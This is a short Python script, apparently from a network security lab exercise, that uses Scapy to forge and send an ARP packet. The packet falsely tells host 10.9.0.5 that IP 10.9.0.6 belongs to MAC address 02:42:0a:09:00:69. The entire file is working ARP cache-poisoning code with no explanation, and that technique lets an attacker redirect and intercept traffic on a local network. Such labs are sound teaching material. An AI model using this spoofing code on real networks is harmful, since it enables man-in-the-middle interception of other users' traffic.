#!/usr/bin/python3
from scapy.all import *
 
E = Ether()
 
A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')
 
pkt = E/A
pkt.show()
sendp(pkt)
